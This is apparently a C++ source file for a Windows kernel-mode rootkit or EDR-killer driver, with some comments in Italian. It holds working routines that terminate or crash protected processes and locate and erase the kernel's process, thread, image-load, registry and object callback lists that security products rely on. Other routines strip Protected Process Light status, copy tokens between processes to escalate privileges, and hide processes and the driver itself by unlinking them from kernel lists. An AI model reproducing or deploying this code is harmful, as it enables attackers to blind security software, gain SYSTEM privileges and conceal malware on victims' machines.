#include "utils.h"



extern "C" NTSTATUS ZwQueryInformationProcess(
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN ULONG ProcessInformationLength,
    OUT PULONG ReturnLength OPTIONAL);


NTSTATUS TermProcess(ULONG_PTR pidVal) {
    NTSTATUS status;
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES oa;
    CLIENT_ID cid;

    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    cid.UniqueProcess = (HANDLE)pidVal;
    cid.UniqueThread = NULL;

    status = ZwOpenProcess(&hProcess, 1, &oa, &cid);
    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[%s] ZwOpenProcess failed for PID %llu (0x%08X)\n",
            DRIVER_NAME, (unsigned long long)pidVal, status);
        return STATUS_UNSUCCESSFUL;
    }

    status = ZwTerminateProcess(hProcess, STATUS_SUCCESS);
    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[%s] ZwTerminateProcess failed for PID %llu (0x%08X)\n",
            DRIVER_NAME, (unsigned long long)pidVal, status);
    }
    else {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
            "[%s] Terminated PID %llu\n",
            DRIVER_NAME, (unsigned long long)pidVal);
    }

    ZwClose(hProcess);

    return STATUS_SUCCESS;
}

NTSTATUS crashProcess(ULONG_PTR pidVal) {
    NTSTATUS status;
    HANDLE hProcess;

    PEPROCESS eProcess = NULL;
    status = PsLookupProcessByProcessId((HANDLE)pidVal, &eProcess);
    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[%s] PsLookupProcessByProcessId failed for PID %llu (0x%08X)\n",
            DRIVER_NAME, (unsigned long long)pidVal, status);
        return STATUS_UNSUCCESSFUL;
    }

    status = ObOpenObjectByPointer(eProcess, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, *PsProcessType, KernelMode, &hProcess);
    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[%s] ObOpenObjectByPointer failed for PID %llu (0x%08X)\n",
            DRIVER_NAME, (unsigned long long)pidVal, status);
        return STATUS_UNSUCCESSFUL;
    }
    // attacchiamo il current kernel thread al target process address space
    KAPC_STATE apcState;
    KeStackAttachProcess(eProcess, &apcState);

    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength = 0;


    // queryaimo info basic sui processi per prendere il PEB base address
    status = ZwQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength);
    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[%s] ZwQueryInformationProcess failed for PID %llu (0x%08X)\n",
            DRIVER_NAME, (unsigned long long)pidVal, status);
        KeUnstackDetachProcess(&apcState);
        ZwClose(hProcess);
        return STATUS_UNSUCCESSFUL;

    }
    PVOID baseAddress = pbi.PebBaseAddress;
    SIZE_T size = 4096;

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
        "[%s] Crashing PID %llu by writing to PEB at address 0x%p\n",
        DRIVER_NAME, (unsigned long long)pidVal, baseAddress);

    // MDL Memry Descriptor List per il target process.
    if (baseAddress != NULL) {
        PMDL mdl = IoAllocateMdl(baseAddress, (ULONG)size, FALSE, FALSE, NULL);
        if (mdl != NULL) {
            DbgPrintEx(0, 0, "Mdl Allocated\n");

            __try {
                // lockiamo le pagine in memoria fisica e prepariamo per accesso
                MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);
                DbgPrintEx(0, 0, "pages locked\n");

                PVOID mappedAddress = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);

                if (mappedAddress != NULL) {
                    DbgPrintEx(0, 0, "pages mapped at address: %p\n", mappedAddress);

                    RtlFillMemory(mappedAddress, size, 0xcc);
                    DbgPrintEx(0, 0, "[%s] Memory corrupted.\n", DRIVER_NAME);
                    MmUnmapLockedPages(mappedAddress, mdl);
                    DbgPrintEx(0, 0, "[%s] Pages unmapped.\n", DRIVER_NAME);
                }
                // unlock pages
                MmUnlockPages(mdl);
                DbgPrintEx(0, 0, "[%s] Pages unlocked.\n", DRIVER_NAME);
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                DbgPrintEx(0, 0, "[%s] Exception while accessing process memory.\n", DRIVER_NAME);
                return STATUS_UNSUCCESSFUL;
            }
            IoFreeMdl(mdl);
        }
    }
    KeUnstackDetachProcess(&apcState);


    ZwClose(hProcess);
    ObDereferenceObject(eProcess);

    return STATUS_SUCCESS;
}

NTSTATUS unmapProcess(ULONG_PTR pidVal) {
    NTSTATUS status;
    PEPROCESS eProcess = NULL;
	PVOID baseAddress = 0;
    status = PsLookupProcessByProcessId((HANDLE)pidVal, &eProcess);

    PFN_PsGetProcessSectionBaseAddress pPsGetProcessSectionBaseAddress = NULL;
    PFN_MmUnmapViewOfSection pMmUnmapViewOfSection = NULL;

	UNICODE_STRING routineName;

	RtlInitUnicodeString(&routineName, L"PsGetProcessSectionBaseAddress");

	pPsGetProcessSectionBaseAddress = (PFN_PsGetProcessSectionBaseAddress)MmGetSystemRoutineAddress(&routineName);

	RtlInitUnicodeString(&routineName, L"MmUnmapViewOfSection");

	pMmUnmapViewOfSection = (PFN_MmUnmapViewOfSection)MmGetSystemRoutineAddress(&routineName);

	baseAddress = (PVOID)pPsGetProcessSectionBaseAddress(eProcess);


	status = pMmUnmapViewOfSection(eProcess, baseAddress);

    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[%s] MmUnmapViewOfSection failed for PID %llu (0x%08X)\n",
            DRIVER_NAME, (unsigned long long)pidVal, status);
        return STATUS_UNSUCCESSFUL;
    }
    else {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL,
            "[%s] Unmapped section of PID %llu\n",
            DRIVER_NAME, (unsigned long long)pidVal);
    }
    ObDereferenceObject(eProcess);
	return STATUS_SUCCESS;
}

ModulesData* EnumRegisteredDrivers(UINT64 NotifyArrayAddr) {
    ModulesData moduleInfo = { 0 };
    NTSTATUS status = STATUS_SUCCESS;
    UINT64 callbackAddr = 0;
    UINT64 tmpPtr = 0;
    //LPVOID* 

	ModulesDataArray result = { 0 };
	ModulesData* modules;

	modules = (ModulesData*)ExAllocatePool2(POOL_FLAG_PAGED, sizeof(ModulesData) * 64, DRIVER_TAG);
    if (modules == NULL) {
        DbgPrintEx(0, 0, "[%s] ExAllocatePool2 failed\n", DRIVER_NAME);
        return NULL;
	}
	int modulesCount = 0;

    for (int i = 0; i < 64; i++) {
        tmpPtr = NotifyArrayAddr + i * 8;
        callbackAddr = *(PUINT64)(tmpPtr);

        //callbackAddr = *(callbackAddr & 0xfffffffffffffff8); // Mask to get the actual address (for x64 systems)

        //DbgPrintEx(0, 0, "[%s] Process Notify Callback %d Address: 0x%llx\n", DRIVER_NAME, i, callbackAddr);

        if (callbackAddr && MmIsAddressValid((PVOID)callbackAddr)) {
            callbackAddr = *(PUINT64)(callbackAddr & 0xfffffffffffffff8); // Mask to get the actual address (for x64 systems)
            status = SearchModules(callbackAddr, &moduleInfo);
            if (NT_SUCCESS(status)) {
                //DbgPrintEx(0, 0, "[%s] Process Notify Callback %d: 0x%llx in module %s\n", DRIVER_NAME, i, callbackAddr, (PCSTR)moduleInfo.ModuleName);
				modules[i] = moduleInfo;
            }
            //else {
            //    //DbgPrintEx(0, 0, "[%s] Process Notify Callback %d: 0x%llx in unknown module\n", DRIVER_NAME, i, callbackAddr);
            //}
        }
        modulesCount++;

    }
    // print modules to double check

    for (int j = 0; j < modulesCount; j++) {
        if (modules[j].ModuleBase == 0)
			continue;
        DbgPrintEx(0, 0, "[%s] Found Module %d: %s at base address: 0x%llx\n",
            DRIVER_NAME,
            j,
            (PCSTR)modules[j].ModuleName,
            (ULONG64)modules[j].ModuleBase);
	}



	return modules;
}


UINT64 FindProcNotifyRoutineAddress(UINT64 kernelBase, NOTIFY_ROUTINE_TYPE callbackType) {
    UINT64 routineAddress = 0;
    UINT64 tempAddress = 0;
    UINT64 notifyArrayAddress = 0;
    UNICODE_STRING routineName;

    UNREFERENCED_PARAMETER(kernelBase);
    UNREFERENCED_PARAMETER(callbackType);

    RtlInitUnicodeString(&routineName, L"PsSetCreateProcessNotifyRoutine");


    routineAddress = (UINT64)MmGetSystemRoutineAddress(&routineName);
    if (!routineAddress) {
        DbgPrintEx(0, 0, "[%s] MmGetSystemRoutineAddress failed to get PsSetCreateProcessNotifyRoutine\n", DRIVER_NAME);
        return 0;
    }
    // PRATICAMENTE TROVIAMO LA CALL A PspSetCreateProcessNotifyRoutine. PsSetCreateProcessNotifyRoutine FA UNA CALL A PspSetCreateProcessNotifyRoutine CHE A SUA VOLTA FA UNA LEA CHE CARICA L'INDIRIZZO DELL'ARRAY DI CALLBACK IN R13
    for (int offset = 0; offset < 0x100; offset++) {
        unsigned char instruction = *((unsigned char*)(routineAddress + offset));
        if (instruction == 0xe9 || instruction == 0xe8) { // CALL or JMP
            LONG relativeOffset = *((LONG*)(routineAddress + offset + 1));

            tempAddress = routineAddress + offset + 5 + relativeOffset;
            break;
        }
    }
    if (!tempAddress) {
        DbgPrintEx(0, 0, "[%s] Failed to find call/jmp instruction in PsSetCreateProcessNotifyRoutine\n", DRIVER_NAME);
        return 0;
    }

    //effettivamente la prima lea di PspSetCreateProcessNotifyRoutine. carica in r13 l'indirizzo di PspCreateProcessNotifyRoutine

    for (int offset = 0; offset < 300; offset++) {
        unsigned char prefix = *((unsigned char*)(tempAddress + offset));
        if ((prefix == 0x48 || prefix == 0x4C) && (*(unsigned char*)(tempAddress + offset + 1) == 0x8D)) { // LEA
            LONG relativeOffset = *((LONG*)(tempAddress + offset + 3));

            notifyArrayAddress = tempAddress + offset + 7 + relativeOffset;
            break;
        }
    }

    return notifyArrayAddress;
}

UINT64 FindThreadNotifyRoutineAddress(UINT64 kernelBase, NOTIFY_ROUTINE_TYPE callbackType) {
    UINT64 routineAddress = 0;
    UINT64 tempAddress = 0;
    UINT64 notifyArrayAddress = 0;
    UNICODE_STRING routineName;

    UNREFERENCED_PARAMETER(kernelBase);
    UNREFERENCED_PARAMETER(callbackType);

    RtlInitUnicodeString(&routineName, L"PsSetCreateThreadNotifyRoutine");


    routineAddress = (UINT64)MmGetSystemRoutineAddress(&routineName);
    if (!routineAddress) {
        DbgPrintEx(0, 0, "[%s] MmGetSystemRoutineAddress failed to get PsSetCreateThreadNotifyRoutine\n", DRIVER_NAME);
        return 0;
    }
    // PRATICAMENTE TROVIAMO LA CALL A PspSetCreateThreadNotifyRoutine. PsSetCreateProcessNotifyRoutine FA UNA CALL A PsSetCreateThreadNotifyRoutine CHE A SUA VOLTA FA UNA LEA CHE CARICA L'INDIRIZZO DELL'ARRAY DI CALLBACK IN R13
    for (int offset = 0; offset < 0x100; offset++) {
        unsigned char instruction = *((unsigned char*)(routineAddress + offset));
        if (instruction == 0xe9 || instruction == 0xe8) { // CALL or JMP
            LONG relativeOffset = *((LONG*)(routineAddress + offset + 1));

            tempAddress = routineAddress + offset + 5 + relativeOffset;
            break;
        }
    }
    if (!tempAddress) {
        DbgPrintEx(0, 0, "[%s] Failed to find call/jmp instruction in PsSetCreateThreadNotifyRoutine\n", DRIVER_NAME);
        return 0;
    }

    //effettivamente la prima lea di PspSetCreateProcessNotifyRoutine. carica in r13 l'indirizzo di PspCreateProcessNotifyRoutine

    for (int offset = 0; offset < 300; offset++) {
        unsigned char prefix = *((unsigned char*)(tempAddress + offset));
        if ((prefix == 0x48 || prefix == 0x4C) && (*(unsigned char*)(tempAddress + offset + 1) == 0x8D)) { // LEA
            LONG relativeOffset = *((LONG*)(tempAddress + offset + 3));

            notifyArrayAddress = tempAddress + offset + 7 + relativeOffset;
            break;
        }
    }

    return notifyArrayAddress;
}

// here the first call calls PsSetLoadImageNotifyRoutineEx, also the first LEA of PspSetLoadImageNotifyRoutineEx loads in R13 the address of the array of callbacks
UINT64 FindLoadImageNotifyRoutineAddress(UINT64 kernelBase, NOTIFY_ROUTINE_TYPE callbackType) {
    UINT64 routineAddress = 0;
    UINT64 tempAddress = 0;
    UINT64 notifyArrayAddress = 0;
    UNICODE_STRING routineName;

    UNREFERENCED_PARAMETER(kernelBase);
    UNREFERENCED_PARAMETER(callbackType);

    RtlInitUnicodeString(&routineName, L"PsSetLoadImageNotifyRoutine");

    
    routineAddress = (UINT64)MmGetSystemRoutineAddress(&routineName);
    if (!routineAddress) {
        DbgPrintEx(0, 0, "[%s] MmGetSystemRoutineAddress failed to get PsSetLoadImageNotifyRoutine\n", DRIVER_NAME);
        return 0;
    }
    // PRATICAMENTE TROVIAMO LA CALL A PspSetCreateThreadNotifyRoutine. PsSetLoadImageNotifyRoutine FA UNA CALL A PsSetLoadImageNotifyRoutineEx CHE A SUA VOLTA FA UNA LEA CHE CARICA L'INDIRIZZO DELL'ARRAY DI CALLBACK IN R13
    for (int offset = 0; offset < 0x100; offset++) {
        unsigned char instruction = *((unsigned char*)(routineAddress + offset));
        if (instruction == 0xe9 || instruction == 0xe8) { // CALL or JMP
            LONG relativeOffset = *((LONG*)(routineAddress + offset + 1));

            tempAddress = routineAddress + offset + 5 + relativeOffset;
            break;
        }
    }
    if (!tempAddress) {
        DbgPrintEx(0, 0, "[%s] Failed to find call/jmp instruction in PsSetLoadImageNotifyRoutine\n", DRIVER_NAME);
        return 0;
    }


    for (int offset = 0; offset < 300; offset++) {
        unsigned char prefix = *((unsigned char*)(tempAddress + offset));
        if ((prefix == 0x48 || prefix == 0x4C) && (*(unsigned char*)(tempAddress + offset + 1) == 0x8D)) { // LEA
            LONG relativeOffset = *((LONG*)(tempAddress + offset + 3));

            notifyArrayAddress = tempAddress + offset + 7 + relativeOffset;
            break;
        }
    }

    return notifyArrayAddress;
}
//CmRegistercallback----1st call---- > CmpRegisterCallbackInternal----5th call oppure subito dopo(quindi 9 0xcc prima)----->CmpInsertCallbackInListByAltitude
// -- primo LEA-- > CallbackListHead

UINT64 FindRegCallbackNotifyRoutineAddress(UINT64 kernelBase, NOTIFY_ROUTINE_TYPE callbackType) {
    UINT64 routineAddress = 0;
    UINT64 tempAddress = 0;
	UINT64 CmpInsertCallbackInListByAltitudeAddress = 0;
    UINT64 notifyArrayAddress = 0;
    UNICODE_STRING routineName;

    UNREFERENCED_PARAMETER(kernelBase);
    UNREFERENCED_PARAMETER(callbackType);
    RtlInitUnicodeString(&routineName, L"CmRegisterCallback");


    routineAddress = (UINT64)MmGetSystemRoutineAddress(&routineName);
    if (!routineAddress) {
        DbgPrintEx(0, 0, "[%s] MmGetSystemRoutineAddress failed to get CmRegistercallback\n", DRIVER_NAME);
        return 0;
    }

    for (int offset = 0; offset < 0x100; offset++) {
        unsigned char instruction = *((unsigned char*)(routineAddress + offset));
        if (instruction == 0xe9 || instruction == 0xe8) { // CALL or JMP
            LONG relativeOffset = *((LONG*)(routineAddress + offset + 1));
            tempAddress = routineAddress + offset + 5 + relativeOffset;
            break;
        }
	}

    if (!tempAddress) {
        DbgPrintEx(0, 0, "[%s] Failed to find call/jmp instruction in PsSetLoadImageNotifyRoutine\n", DRIVER_NAME);
        return 0;
    }
    //CmpRegisterCallbackInternal----5th call oppure subito dopo(quindi 9 0xcc prima)----->CmpInsertCallbackInListByAltitude
    for (int offset = 0; offset < 0x200; offset++) {
        unsigned char prefix = *((unsigned char*)(tempAddress + offset));
        unsigned char prevPrefix = *((unsigned char*)(tempAddress + offset - 1));

        if ((prefix == 0xcc && prevPrefix == 0xcc) && (*(unsigned char*)(tempAddress + offset + 1) == 0x48)) { // 
            //LONG relativeOffset = *((LONG*)(tempAddress + offset + 3));

            CmpInsertCallbackInListByAltitudeAddress = tempAddress + offset + 1;
            break;
        }
    }
    if (!CmpInsertCallbackInListByAltitudeAddress) {
        DbgPrintEx(0, 0, "[%s] Failed to find CmpInsertCallbackInListByAltitudeAddress instruction in CmRegistercallback\n", DRIVER_NAME);
        return 0;
	}
	DbgPrintEx(0, 0, "[%s] CmpInsertCallbackInListByAltitudeAddress: 0x%llx\n", DRIVER_NAME, CmpInsertCallbackInListByAltitudeAddress);
    
    for (int offset = 0; offset < 300; offset++) {
        unsigned char prefix = *((unsigned char*)(CmpInsertCallbackInListByAltitudeAddress + offset));
        if ((prefix == 0x48 || prefix == 0x4C) && (*(unsigned char*)(CmpInsertCallbackInListByAltitudeAddress + offset + 1) == 0x8D)) { // LEA
            LONG relativeOffset = *((LONG*)(CmpInsertCallbackInListByAltitudeAddress + offset + 3));

            notifyArrayAddress = CmpInsertCallbackInListByAltitudeAddress + offset + 7 + relativeOffset;
            break;
        }
    }
    if (!notifyArrayAddress) {
        DbgPrintEx(0, 0, "[%s] Failed to find LEA instruction in CmpInsertCallbackInListByAltitudeAddress\n", DRIVER_NAME);
        return 0;
	}

	return notifyArrayAddress;
}



NTSTATUS SearchModules(ULONG64 ModuleAddr, ModulesData* ModuleFound) {
    NTSTATUS status = STATUS_SUCCESS;
    ULONG modulesSize = 0;
    AUX_MODULE_EXTENDED_INFO* modules = NULL;
    ULONG numberOfModules = 0;

    // Step 1: Initialize the Auxiliary Kernel Library
    status = AuxKlibInitialize();
    if (!NT_SUCCESS(status))
    {
        DbgPrintEx(0, 0, "[%s] AuxKlibInitialize fail %d\n", DRIVER_NAME, status);
        return status;
    }

    ModulesData ModuleFound2 = *ModuleFound;
    // take info abt kernel drivers
    status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), NULL);

    if (!NT_SUCCESS(status) || modulesSize == 0) {
        DbgPrintEx(0, 0, "[%s] AuxKlibQueryModuleInformation failed to get size (0x%X)\n", DRIVER_NAME, status);
        return status;
    }

    numberOfModules = modulesSize / sizeof(AUX_MODULE_EXTENDED_INFO);

    modules = (AUX_MODULE_EXTENDED_INFO*)ExAllocatePool2(POOL_FLAG_PAGED, modulesSize, DRIVER_TAG);
    if (modules == NULL) {
        DbgPrintEx(0, 0, "[%s] ExAllocatePool2 failed\n", DRIVER_NAME);
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    // Query module information into the allocated buffer
    status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), modules);
    if (!NT_SUCCESS(status)) {
        DbgPrintEx(0, 0, "[%s] AuxKlibQueryModuleInformation failed (0x%X)\n", DRIVER_NAME, status);
        ExFreePoolWithTag(modules, DRIVER_TAG);
        return status;
    }


    DbgPrintEx(0, 0, "[%s] Searching for module containing address: 0x%llx\n", DRIVER_NAME, ModuleAddr);
    for (ULONG i = 0; i < numberOfModules; i++) {
        //     DbgPrintEx(0, 0, "[%s] Module %d: %s at base address: 0x%llx, size: 0x%x\n",
        //         DRIVER_NAME,
        //         i,
        //         (PCSTR)&modules[i].FullPathName[modules[i].FileNameOffset],
        //         (ULONG64)modules[i].BasicInfo.ImageBase,
                 //modules[i].ImageSize);
        if ((ModuleAddr > (ULONG64)modules[i].BasicInfo.ImageBase) && (ModuleAddr < ((ULONG64)modules[i].BasicInfo.ImageBase + modules[i].ImageSize))) {
            //DbgPrintEx(0, 0, "[%s] Found module: %s at base address: 0x%llx\n",
            //    DRIVER_NAME,
            //    (PCSTR)&modules[i].FullPathName[modules[i].FileNameOffset],
            //    (ULONG64)modules[i].BasicInfo.ImageBase);


            strcpy(ModuleFound2.ModuleName, (CHAR*)(modules[i].FullPathName + modules[i].FileNameOffset));
			memcpy(&ModuleFound2.ModuleBase, &modules[i].BasicInfo.ImageBase, sizeof(ULONG64));
            *ModuleFound = ModuleFound2;

            DbgPrintEx(0, 0, "[%s] Module name: %s\n", DRIVER_NAME, ModuleFound2.ModuleName);
            ExFreePoolWithTag(modules, DRIVER_TAG);
            return status;
        }
    }

    ExFreePoolWithTag(modules, DRIVER_TAG);
    return status;

}


NTSTATUS DeleteNotifyEntry(ULONG64 procNotifyArrayAddr, int  indexToRemove) {
	*(ULONG64*)(procNotifyArrayAddr + indexToRemove * 8) = (ULONG64)0;
    if (*(ULONG64*)(procNotifyArrayAddr + indexToRemove * 8) == 0) {
        DbgPrintEx(0, 0, "[%s] Successfully removed entry at index %d\n", DRIVER_NAME, indexToRemove);
        return STATUS_SUCCESS;
    }
    else {
        DbgPrintEx(0, 0, "[%s] Failed to remove entry at index %d\n", DRIVER_NAME, indexToRemove);
        return STATUS_UNSUCCESSFUL;
	}
}


NTSTATUS DeleteRegCallbackEntry(ULONG64 regCallbackArrayAddr) {
	LIST_ENTRY* listHead = (LIST_ENTRY*)regCallbackArrayAddr;
    listHead->Flink = listHead;
	listHead->Blink = listHead;

    if (listHead->Flink == listHead && listHead->Blink == listHead) {
        DbgPrintEx(0, 0, "[%s] Successfully removed registry callback entry\n", DRIVER_NAME);
        return STATUS_SUCCESS;
    }
    else {
        DbgPrintEx(0, 0, "[%s] Failed to remove registry callback entry\n", DRIVER_NAME);
        return STATUS_UNSUCCESSFUL;
	}
}

NTSTATUS RemObjCallbackNotifyRoutineAddress() {
    DWORD64 ProcessObjectType = (DWORD64)*PsProcessType;
    DWORD64 ThreadObjectType = (DWORD64)*PsThreadType;

    LIST_ENTRY* procListHead = (LIST_ENTRY*)(ProcessObjectType + 0xc8);
    procListHead->Flink = procListHead;
	procListHead->Blink = procListHead;

	LIST_ENTRY* threadListHead = (LIST_ENTRY*)(ThreadObjectType + 0xc8);
	threadListHead->Flink = threadListHead;
	threadListHead->Blink = threadListHead;

    if (procListHead->Flink == procListHead && procListHead->Blink == procListHead) {
        DbgPrintEx(0, 0, "[%s] Successfully removed object callback entry\n", DRIVER_NAME);
    }
    else {
        DbgPrintEx(0, 0, "[%s] Failed to remove process callback entry\n", DRIVER_NAME);
        return STATUS_UNSUCCESSFUL;
    }
    return 0;
}

NTSTATUS pplBypass(UINT64 pidVal, int offset) {
	NTSTATUS status;

    PEPROCESS eProcess = NULL;
    status = PsLookupProcessByProcessId((HANDLE)pidVal, &eProcess);

    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[%s] PsLookupProcessByProcessId failed for PID %llu (0x%08X)\n",
            DRIVER_NAME, (unsigned long long)pidVal, status);
        return STATUS_UNSUCCESSFUL;
	}
	DbgPrintEx(0, 0, "protection: 0x%llx\n", *(PUINT64)((UINT64)eProcess + offset));

	//_PS_PROTECTION protection = *(_PS_PROTECTION*)((UINT64)eProcess->Protection);

	*(PUINT64)((UINT64)eProcess + offset) = 0;

	DbgPrintEx(0, 0, "new protection: 0x%llx\n", *(PUINT64)((UINT64)eProcess + offset));
    if (*(PUINT64)((UINT64)eProcess + offset) == 0) {
        DbgPrintEx(0, 0, "[%s] Successfully removed PPL protection for PID %llu\n", DRIVER_NAME, (unsigned long long)pidVal);
    }
    else {
        DbgPrintEx(0, 0, "[%s] Failed to remove PPL protection for PID %llu\n", DRIVER_NAME, (unsigned long long)pidVal);
        ObDereferenceObject(eProcess);
        return STATUS_UNSUCCESSFUL;
    }
	return STATUS_SUCCESS;

}

NTSTATUS procTokenSwap(DWORD pid1,DWORD pid2, int offset) {
	NTSTATUS status;
	PEPROCESS eProcess1 = NULL;
	PEPROCESS eProcess2 = NULL;

	status = PsLookupProcessByProcessId((HANDLE)pid1, &eProcess1);
    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[%s] PsLookupProcessByProcessId failed for PID %llu (0x%08X)\n",
            DRIVER_NAME, (unsigned long long)pid1, status);
        return STATUS_UNSUCCESSFUL;
	}

    status = PsLookupProcessByProcessId((HANDLE)pid2, &eProcess2);
    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[%s] PsLookupProcessByProcessId failed for PID %llu (0x%08X)\n",
            DRIVER_NAME, (unsigned long long)pid2, status);
        ObDereferenceObject(eProcess2);
        return STATUS_UNSUCCESSFUL;
	}

	DbgPrintEx(0, 0, "trying to copy token from pid %d to pid %d\n", pid2, pid1);
    
    *(PUINT64)((UINT64)eProcess1 + offset) = *(PUINT64)((UINT64)eProcess2 + offset);

	ObDereferenceObject(eProcess1);
	ObDereferenceObject(eProcess2);
    return STATUS_SUCCESS;
}

NTSTATUS procHiding(DWORD pidVal, DWORD offset) {
    NTSTATUS status;
    PEPROCESS eProcess = NULL;

    status = PsLookupProcessByProcessId((HANDLE)pidVal, &eProcess);
    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[%s] PsLookupProcessByProcessId failed for PID %lu (0x%08X)\n",
            DRIVER_NAME, pidVal, status);
        return status;
    }

    // Attach to target process context to safely access its memory

    LIST_ENTRY* listEntry = (LIST_ENTRY*)((UINT64)eProcess + offset);

    // Comprehensive memory validation
    if (!MmIsAddressValid(listEntry) ||
        !MmIsAddressValid(listEntry->Flink) ||
        !MmIsAddressValid(listEntry->Blink)) {
        ObDereferenceObject(eProcess);
        return STATUS_ACCESS_VIOLATION;
    }
	DbgPrintEx(0, 0, "[%s] Hiding process PID %lu\n", DRIVER_NAME, pidVal);



    // Enhanced list integrity check
    if (listEntry->Flink->Blink != listEntry || listEntry->Blink->Flink != listEntry) {
        ObDereferenceObject(eProcess);
        DbgPrintEx(0, 0, "[%s] List integrity check failed for PID %lu\n", DRIVER_NAME, pidVal);
        return STATUS_UNSUCCESSFUL;
    }

    // Perform the removal
    listEntry->Flink->Blink = listEntry->Blink;
    listEntry->Blink->Flink = listEntry->Flink;

    // Self-link
    listEntry->Flink = listEntry;
    listEntry->Blink = listEntry;

    ObDereferenceObject(eProcess);

    DbgPrintEx(0, 0, "[%s] Successfully hid process PID %lu\n", DRIVER_NAME, pidVal);
    return STATUS_SUCCESS;
}

NTSTATUS unlinkDriver(PDRIVER_OBJECT DriverObject) {
	PMODULE_ENTRY prevModule, nextModule, currentModule;

	currentModule = (PMODULE_ENTRY)DriverObject->DriverSection;
	prevModule = (PMODULE_ENTRY)currentModule->InLoadOrderLinks.Blink;
	nextModule = (PMODULE_ENTRY)currentModule->InLoadOrderLinks.Flink;

	DbgPrintEx(0, 0, "[%s] Unlinking driver %wZ\n", DRIVER_NAME, &DriverObject->DriverName);
	prevModule->InLoadOrderLinks.Flink = currentModule->InLoadOrderLinks.Flink;
	nextModule->InLoadOrderLinks.Blink = currentModule->InLoadOrderLinks.Blink;

	currentModule->InLoadOrderLinks.Flink = (PLIST_ENTRY)currentModule;
	currentModule->InLoadOrderLinks.Blink = (PLIST_ENTRY)currentModule;

	DbgPrintEx(0, 0, "[%s] Successfully unlinked driver %wZ\n", DRIVER_NAME, &DriverObject->DriverName);

	return STATUS_SUCCESS;
}

UINT64 FindKernelBase() {
    UNICODE_STRING functionName;
    PFN_ZwQuerySystemInformation querySysInfo;
    NTSTATUS status;
    ULONG requiredSize;
    SIZE_T allocationSize;
    UINT64 kernelBase = 0;
    PRTL_PROCESS_MODULES moduleInfo = NULL;

    RtlInitUnicodeString(&functionName, L"ZwQuerySystemInformation");

    // dynamically get the address of ZwQuerySystemInformation
    querySysInfo = (PFN_ZwQuerySystemInformation)MmGetSystemRoutineAddress(&functionName);

    if (!querySysInfo) {
        DbgPrintEx(0, 0, "[%s] MmGetSystemRoutineAddress failed to get ZwQuerySystemInformation\n", DRIVER_NAME);
        return kernelBase;
    }

    status = querySysInfo((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, NULL, 0, &requiredSize);

    if (status != STATUS_INFO_LENGTH_MISMATCH) {
        DbgPrintEx(0, 0, "[%s] ZwQuerySystemInformation failed to get size (0x%X)\n", DRIVER_NAME, status);
        return kernelBase;
    }

    allocationSize = requiredSize;
    while (status == STATUS_INFO_LENGTH_MISMATCH) {
        allocationSize += sizeof(ULONG);
        moduleInfo = (PRTL_PROCESS_MODULES)ExAllocatePool2(POOL_FLAG_NON_PAGED, allocationSize, 'Tag1');
        if (!moduleInfo) {
            DbgPrintEx(0, 0, "[%s] ExAllocatePool2 failed\n", DRIVER_NAME);
            return kernelBase;
        }
        status = querySysInfo((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, moduleInfo, (ULONG)allocationSize, &requiredSize);
        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            ExFreePoolWithTag(moduleInfo, 'Tag1');
            moduleInfo = NULL;
        }
    }
    if (!NT_SUCCESS(status)) {
        if (moduleInfo) {
            ExFreePoolWithTag(moduleInfo, 'Tag1');
        }
        return kernelBase;
    }
    kernelBase = (UINT64)moduleInfo->Modules[0].ImageBase;
    ExFreePoolWithTag(moduleInfo, 'Tag1');
    return kernelBase;
}
